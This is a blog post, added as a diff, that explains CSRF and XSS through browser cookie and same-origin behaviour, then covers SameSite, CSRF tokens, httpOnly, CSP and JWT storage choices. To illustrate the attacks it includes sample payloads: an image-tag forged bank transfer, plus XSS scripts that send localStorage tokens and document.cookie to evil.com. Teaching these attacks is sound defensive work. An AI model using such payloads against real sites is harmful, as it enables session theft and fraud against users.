@@ -1,0 +1,331 @@
+---
+title: 'CSRF and XSS — What They Actually Are and Why the Defences Work'
+publishedAt: '2026-03-17'
+summary: 'Two attacks with similar names and completely different mechanisms. This is the explanation I wished I had — built from browser behaviour up, so the defences stop being rules to memorise and start being obvious.'
+tags: ['security', 'web', 'auth', 'engineering']
+---
+
+Every time authentication comes up in a code review or a system design conversation, CSRF and XSS get thrown around like everyone knows exactly what they mean and how they differ. For a long time I nodded along. I knew they were dangerous, I knew they involved cookies and tokens, and I knew the defences — `httpOnly`, `SameSite`, CSRF tokens. But I couldn't have told you *why* those defences work, or what exactly each attack was actually doing.
+
+What finally made it click was going back one level: understanding what browsers do automatically, before any attack happens. Once that's clear, both attacks are just logical consequences — and the defences stop being a list of rules to memorise and start being obvious.
+
+This is that explanation, built from the ground up.
+
+| Attack | Full name | What is abused | Who fires the request |
+|---|---|---|---|
+| CSRF | Cross-Site Request Forgery | Browser auto-attaches cookies | Your browser, tricked |
+| XSS | Cross-Site Scripting | Browser trusts all same-origin code | Attacker's script, running inside your app |
+
+---
+
+## Part 1 — Browser fundamentals
+
+Understanding these two things makes every attack and every defence obvious.
+
+### The Cookie header — and what browsers send automatically
+
+A cookie is not magic. It is just an HTTP header. When the server sets a cookie:
+
+```http
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
+```
+
+The browser stores it and from that point sends it back as the `Cookie` header on every matching request — automatically, without your JavaScript doing anything:
+
+```http
+GET /dashboard HTTP/1.1
+Host: your-bank.com
+Cookie: session=abc123
+```
+
+This automatic behaviour is the root cause of CSRF. Understanding it also explains why every defence targets it specifically.
+
+**What browsers send automatically on every request**
+
+| Header | What it contains | Security relevance |
+|---|---|---|
+| `Cookie` | All matching cookies for the domain | The CSRF attack surface |
+| `Host` | The domain being requested | Required by HTTP spec |
+| `User-Agent` | Browser and OS identity | Fingerprinting only |
+| `Accept` | Content types the browser accepts | None |
+| `Accept-Language` | User's preferred language | None |
+| `Accept-Encoding` | Supported compression formats | None |
+| `Referer` | Full URL of the page that triggered the request | Weak CSRF signal — browsers may strip it for privacy |
+| `Origin` | Origin (scheme + domain) of the triggering page | Stronger CSRF signal — cannot be set by JS cross-origin |
+
+`Origin` is particularly useful for CSRF defence. When `evil.com` triggers a request to `your-bank.com`, the browser sends:
+
+```http
+Origin: https://evil.com
+```
+
+The server can reject any request whose `Origin` does not match its own domain. Unlike `Referer`, `Origin` cannot be spoofed by JavaScript on a cross-origin page.
+
+**What browsers never send automatically — JavaScript must set these**
+
+```http
+Authorization: Bearer eyJhbGc...     ← your code attaches this
+X-CSRF-Token: a9f3c2...              ← your code attaches this
+Content-Type: application/json       ← your code sets this on POST/PUT
+```
+
+This distinction — auto-sent vs JS-only — is the foundation of why the CSRF token defence works. Keep it in mind as you read the attacks below.
+
+### What `httpOnly` does
+
+`httpOnly` is a flag on a cookie that tells the browser:
+
+> This cookie must never be readable by JavaScript. Only send it as an HTTP header.
+
+`document.cookie` normally lets you read all cookies for the current page. With `httpOnly` set, that cookie is invisible to JavaScript:
+
+```js
+console.log(document.cookie)
+// → "theme=dark; lang=en"   ← httpOnly cookies do not appear here
+```
+
+The browser still sends it automatically on every request as the `Cookie` header — the server receives it fine. But no script on the page can read it, copy it, or exfiltrate it. This matters enormously for XSS, as you will see below.
+
+---
+
+## Part 2 — The attacks
+
+### CSRF — Cross-Site Request Forgery
+
+The attacker never talks to your app directly. They trick **your browser** into firing a request on their behalf — using your real session cookie.
+
+> The request goes from your browser. Not the attacker's.
+
+**How it happens — step by step**
+
+1. You log into `your-bank.com`. Your browser now holds a session cookie for that domain.
+2. Without logging out, you visit `evil.com` — maybe a link in an email, or an ad on another site.
+3. `evil.com` silently loads this in your browser:
+
+```html
+<img src="https://your-bank.com/transfer?to=attacker&amount=9000">
+```
+
+4. Your browser sees an `<img>` tag and fires a GET request to `your-bank.com`. It **automatically attaches your session cookie** — because that is just what browsers do for every request to a domain you have a cookie for.
+5. `your-bank.com` receives a request with a valid session cookie. From its perspective, you asked for the transfer.
+
+The attacker's role is only to write that HTML page. They never touch your bank. They never send a request themselves. They just set a trap on `evil.com` and let your browser walk into it.
+
+**The analogy that makes it click**
+
+Imagine someone sends you a letter that says "sign this cheque and post it." You sign it and post it. The bank receives a cheque with your genuine signature. The fraudster never forged anything — they just got you to do the work. CSRF is that, but the "you" is your browser, and it doesn't ask before signing.
+
+**Why it's tricky to detect**
+
+The request is completely legitimate from the network's point of view. It came from your IP address. It carries your real session cookie. The server has no way to distinguish it from a request you consciously made — unless it specifically checks **where the request originated from**.
+
+---
+
+### XSS — Cross-Site Scripting
+
+The attacker gets their JavaScript **executing inside your legitimate app's origin**. Since the browser trusts all code running under the same origin equally, that script has full access to `localStorage`, cookies, the DOM, and can make API calls as the victim.
+
+> All code running under the same origin is equally trusted — regardless of who wrote it.
+
+**Three ways the script gets in**
+
+**1. Stored XSS** — the attacker submits malicious input (e.g. a comment) that gets saved to the database and rendered for every future visitor.
+
+```html
+<!-- attacker submits this as a "comment" -->
+<script>
+  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
+</script>
+```
+
+Every visitor after that unknowingly runs it. Most dangerous because it is persistent.
+
+**2. Reflected XSS** — the attacker crafts a malicious URL. The server takes a query parameter and reflects it back into the HTML unsanitized.
+
+```
+https://your-app.com/search?q=<script>fetch('https://evil.com/steal?t='+localStorage.getItem('token'))</script>
+```
+
+Here is what happens step by step when the victim clicks that link:
+
+1. The victim receives this URL in an email or chat — it looks like a normal search link to `your-app.com`
+2. They click it. Their browser sends a request to `your-app.com/search` with `q=<script>...</script>` as the query parameter
+3. The server reads the `q` param and builds the HTML response: *"Showing results for: `<script>...</script>`"* — without sanitizing it
+4. The browser receives that HTML **from `your-app.com`**, sees a `<script>` tag, and executes it — because it trusts everything that comes from that origin
+5. The script runs, reads `localStorage`, and sends the token to `evil.com`
+
+The attacker never touched `your-app.com`'s server or database. They just crafted a URL that caused `your-app.com`'s own server to write their script into its own response. The server became the delivery mechanism.
+
+**3. Compromised third-party script** — your own code is clean, but a vendor script you load (analytics, chat widget, CDN library) gets compromised. It loads into your page with full same-origin trust.
+
+```html
+<!-- you wrote this legitimately -->
+<script src="https://cdn.someanalytics.com/tracker.js"></script>
+<!-- if that file is tampered with, it runs as your app -->
+```
+
+Real example: the British Airways breach (2018) — a third-party script on the checkout page was modified to silently exfiltrate card details as users typed.
+
+---
+
+## Part 3 — The defences
+
+### Defending against CSRF
+
+**Defence 1 — SameSite cookie attribute**
+
+Recall the attack payload:
+
+```html
+<img src="https://your-bank.com/transfer?to=attacker&amount=9000">
+```
+
+When the cookie is set with `SameSite`, the browser checks before attaching it:
+
+> Is this request originating from `your-bank.com` itself, or from somewhere else?
+
+Since the `<img>` tag is on `evil.com`, the answer is "somewhere else." The browser **does not attach the cookie**. The request arrives at `your-bank.com` with no session. Attack dead.
+
+`SameSite` has two useful values — `Strict` and `Lax` — which differ only in one edge case:
+
+| | Blocks `<img>` / `<form>` / `fetch` CSRF | Sends cookie when user clicks a link from another site |
+|---|---|---|
+| `SameSite=Strict` | Yes | No — user appears logged out even on legitimate external links |
+| `SameSite=Lax` | Yes | Yes — cookie sent only on top-level navigation |
+
+`Lax` is the sensible default for most apps. `Strict` is for high-security flows where you are willing to accept that UX friction.
+
+**Defence 2 — CSRF token**
+
+A CSRF token is a **random secret value that only your legitimate app knows**. The server generates it, gives it to your frontend, and requires it back on every state-changing request.
+
+1. When you load `your-app.com`, the server generates a random token (e.g. `a9f3c2...`) and sends it to the frontend — in a meta tag, a readable cookie, or an API response
+2. Your JavaScript reads it and attaches it to every mutating request as a custom header:
+
+```http
+POST /transfer
+X-CSRF-Token: a9f3c2...
+Cookie: session=abc123
+```
+
+3. The server checks: does `X-CSRF-Token` match what it issued? If yes, proceed. If missing or wrong, reject with 403.
+
+Why this works: `evil.com` can make your browser send a `Cookie` automatically — but it **cannot make your browser set a custom header**. The browser blocks cross-origin custom headers. Only JavaScript running on `your-app.com` itself can read the token and attach it. So:
+
+- Request with valid cookie **and** valid `X-CSRF-Token` → came from your own frontend ✓
+- Request with valid cookie but **no** `X-CSRF-Token` → forged cross-site request ✗
+
+Both defences together — `SameSite=Lax` and a CSRF token — is the standard production baseline.
+
+---
+
+### Defending against XSS
+
+Without `httpOnly`, a successful XSS attack can do this:
+
+```js
+// injected script running inside your-app.com
+fetch('https://evil.com/steal?cookie=' + document.cookie)
+// → steals session=abc123, attacker replays it from their own machine
+```
+
+With `httpOnly`, that same script runs but `document.cookie` does not contain the session cookie. The attacker cannot steal it and take it elsewhere. They can still abuse the live session (make API calls from within the victim's browser tab), but they cannot take the token away and replay it from a different machine.
+
+That distinction — **session abuse vs token theft** — is the whole reason `httpOnly` matters. Token theft is the worse outcome because a stolen token can be used from anywhere, anytime, by anyone who holds it.
+
+Beyond `httpOnly`, defending against XSS is an ongoing application hygiene problem:
+
+- **Sanitize and encode all output** — user-supplied strings must never be interpreted as HTML or JS
+- **Avoid `innerHTML`** — use `textContent` instead; in React, avoid `dangerouslySetInnerHTML` without sanitization
+- **Content Security Policy (CSP) header** — tells the browser to only execute scripts from whitelisted sources; blocks inline scripts even if injection happens
+- **Audit dependencies** — a compromised npm package is an XSS vector
+
+---
+
+## Part 4 — Where to store JWTs and why it matters
+
+### The risk comparison
+
+| Storage | CSRF risk | XSS risk |
+|---|---|---|
+| `localStorage` | None (browser never auto-sends it) | High — any injected script can read it directly |
+| `httpOnly` cookie | Present — needs `SameSite` + CSRF token | Low — JS cannot read httpOnly cookies |
+| In-memory (JS variable) | None | Low within session, lost on page refresh |
+
+### httpOnly cookie is the best default for web apps
+
+For a web app where the frontend and API are on the same domain, **httpOnly cookie is the right default**:
+
+- The JWT is never accessible to JavaScript — `document.cookie` does not show it
+- The browser sends it automatically on every request — your frontend code does not touch auth at all
+- XSS cannot steal it — the worst an attacker can do is abuse the live session, not take the token away
+- CSRF is closed by `SameSite=Lax` + CSRF token — both are reliable, well-understood fixes
+
+The core reason: CSRF has a clean, complete fix. XSS is a class of problems you manage rather than solve. You want your token protected by the thing that can be fully closed.
+
+### The full production cookie configuration
+
+```http
+Set-Cookie: accessToken=<jwt>;
+  HttpOnly;
+  Secure;
+  SameSite=Lax;
+  Path=/api;
+  Max-Age=900
+```
+
+| Flag | What it does |
+|---|---|
+| `HttpOnly` | JS cannot read it — blocks XSS token theft |
+| `Secure` | Only sent over HTTPS — never exposed on plain HTTP |
+| `SameSite=Lax` | Not sent on cross-site requests — blocks CSRF |
+| `Path=/api` | Scoped to API routes only — not sent on image/font requests |
+| `Max-Age=900` | Expires in 15 minutes — limits damage window if compromised |
+
+Each flag addresses a different threat. All five together is the standard production baseline.
+
+### Then why does Bearer token exist?
+
+If httpOnly cookie is the best default, why does `Authorization: Bearer <jwt>` exist at all?
+
+Because **cookies are a browser concept**. They only exist in browsers. The moment you have a non-browser client, cookies are not an option:
+
+- A native iOS or Android app has no browser cookie jar
+- A CLI tool calling your API has no `document.cookie`
+- A third-party developer integrating your public API cannot use your cookies
+- A microservice calling another microservice has no browser at all
+
+In all these cases, the client stores the token itself (in memory or secure device storage) and attaches it manually:
+
+```http
+GET /api/orders
+Authorization: Bearer eyJhbGc...      ← the app attached this manually, no browser involved
+```
+
+The server does not care whether the JWT arrived in a `Cookie` header or an `Authorization` header — it validates the signature either way. The difference is purely in how the client carries it.
+
+**The practical decision**
+
+| Client type | Use | Why |
+|---|---|---|
+| Next.js / same-origin web app | httpOnly cookie | Browser handles everything, JS never touches auth |
+| Cross-origin SPA (frontend ≠ API domain) | httpOnly cookie with `Domain` config, or Bearer in memory | Depends on setup |
+| Native mobile app (iOS / Android) | Bearer token in secure device storage | No browser cookie jar |
+| CLI tool or script | Bearer token in memory or config | No browser at all |
+| Third-party API consumer | Bearer token | Standard API auth contract |
+| Microservice to microservice | Bearer token | Server-to-server, no browser |
+
+These are two different patterns for two different client environments — not two competing options for the same problem. You pick based on who is calling your API: a browser, or something else.
+
+---
+
+## Quick reference
+
+| | CSRF | XSS |
+|---|---|---|
+| What is attacked | Browser's automatic cookie behaviour | Browser's same-origin trust |
+| Entry point | A page on another domain | Injected script inside your app |
+| Who fires the request | Your browser, without your knowledge | Attacker's code, running as you |
+| Can steal httpOnly cookie | No | No |
+| Can steal localStorage token | No (never touches your app) | Yes |
+| Primary defence | `SameSite=Lax` + CSRF token | `httpOnly` + output sanitization + CSP |
